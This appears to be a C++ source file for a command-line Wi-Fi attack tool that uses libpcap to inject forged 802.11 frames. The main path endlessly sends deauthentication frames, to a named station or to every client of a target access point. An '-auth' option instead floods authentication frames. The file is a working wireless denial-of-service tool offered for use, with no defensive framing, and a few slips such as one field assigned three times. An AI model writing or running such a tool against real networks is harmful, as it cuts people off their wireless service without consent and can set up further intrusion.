#include "stdafx.h"
#include "dot11.h"
 
#define DEAUTHPACKET_LEN 0x26 //38byte
#define AUTHPACKET_LEN 0x36 //54byte

struct DeauthAttackPacket
{
    Dot11RadioTapHdr radiohdr_; //8bytes
    u_int8_t datarate_; //1bytes
    u_int8_t pad_; //1bytes
    u_int16_t txflags_; //2bytes
    Dot11BeaconFrame beaconhdr_; //24bytes
    u_int16_t fixedparam_; //2bytes
};

struct AuthAttackPacket
{
    Dot11RadioTapHdr radiohdr_;
    u_int32_t present_;
    u_int8_t flag_;
    u_int8_t datarate_;
    u_int16_t channelfreq_;
    u_int16_t channelflag_;
    u_int8_t antennasig1_;
    u_int8_t pad_;
    u_int16_t rxflag_;
    u_int8_t antennasig2_;
    u_int8_t antenna_;
    Dot11BeaconFrame beaconhdr_;
    u_int16_t fixedparam1_; //2bytes
    u_int16_t fixedparam2_; //2bytes
    u_int16_t fixedparam3_; //2bytes
};

void usage() {
	printf("syntax : deauth-attack <interface> <ap mac> [<station mac>] [-auth]\n");
	printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

void dumpPacket(const u_char* packet, int len) {
    for(int i = 0;i<len;)
    {
        for(int j = 0; j<8; j++, i++)
        {
            printf("0x");
            printf("%02x ", packet[i]);
            if(i>=len)
            {
                printf("\n");
                return;
            }
        }
        std::cout << " ";
        for(int j = 0; j<8; j++, i++)
        {
            printf("0x");
            printf("%02x ", packet[i]);
            if(i>=len)
            {
                printf("\n");
                return;
            }
        }
        printf("\n");
    }
    printf("\n");
}

int main(int argc, char* argv[]) {
    int flag = 0;
    int res;
    u_int16_t num = 0;

	if (argc < 3 || argc > 5)
    {
        usage();
        return -1;
    }

    if(argc == 5)
    {
        if(strncmp(argv[4], "-auth", 5) == 0)
            flag = 1;
    }

    char* interface = argv[1];
    std::cout << "selected interface: "<< interface << std::endl;

	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf); //1000
	if (handle == NULL) {
		std::cerr << "pcap_open_live(" << interface << ") return null - " << errbuf << std::endl;
		return -1;
	}

    if(flag == 1)
    {
        AuthAttackPacket pk;
        pk.radiohdr_.revision_ = 0x00;
        pk.radiohdr_.pad_ = 0x00;
        pk.radiohdr_.len_ = 0x0018;
        pk.radiohdr_.presentflag_ = 0xa000402e;
        pk.present_ = 0x00000820;
        pk.flag_ = 0x00;
        pk.datarate_ = 0x02;
        pk.channelfreq_ = 0x096c;
        pk.channelflag_ = 0x00a0;
        pk.antennasig1_ = 0xc5;
        pk.pad_ = 0x00;
        pk.rxflag_ = 0x0000;
        pk.antennasig2_ = 0xc5;
        pk.antenna_ = 0x00;
        pk.beaconhdr_.framecontrol_ = 0xb0;
        pk.beaconhdr_.flags_ = 0x00;
        pk.beaconhdr_.duration_ = 0x0000;
        pk.beaconhdr_.addr1_ = Mac(argv[2]);
        pk.beaconhdr_.addr2_ = Mac(argv[3]);
        pk.beaconhdr_.addr3_ = Mac(argv[2]);
        pk.fixedparam1_ = 0x0000;
        pk.fixedparam1_ = 0x0002;
        pk.fixedparam1_ = 0x0000;

        while (true) {
            pk.beaconhdr_.fragseqnum_ = num << 4;
            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pk), AUTHPACKET_LEN);
            printf("Auth packet send seq: %d\n", num);
            num++; usleep(500000);
	    }
    }
    else
    {
        DeauthAttackPacket pk;
        pk.radiohdr_.revision_ = 0x00;
        pk.radiohdr_.pad_ = 0x00;
        pk.radiohdr_.len_ = 0x000c;
        pk.radiohdr_.presentflag_ = 0x00008004;
        pk.datarate_ = 0x02;
        pk.pad_ = 0x00;
        pk.txflags_ = 0x0018;
        pk.beaconhdr_.framecontrol_ = 0xc0;
        pk.beaconhdr_.flags_ = 0x00;
        pk.beaconhdr_.duration_ = 0x0000;
        if(argc == 3)
            pk.beaconhdr_.addr1_ = Mac("ff:ff:ff:ff:ff:ff");
        else if(argc == 4)
            pk.beaconhdr_.addr1_ = Mac(argv[3]);
        pk.beaconhdr_.addr2_ = Mac(argv[2]);
        pk.beaconhdr_.addr3_ = Mac(argv[2]);
        pk.fixedparam_ = 0x0007;

        while (true) {
            pk.beaconhdr_.fragseqnum_ = num << 4;
            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pk), DEAUTHPACKET_LEN);
            printf("Deauth packet send seq: %d\n", num);
            num++; usleep(500000);
	    }
    }
	pcap_close(handle);
}
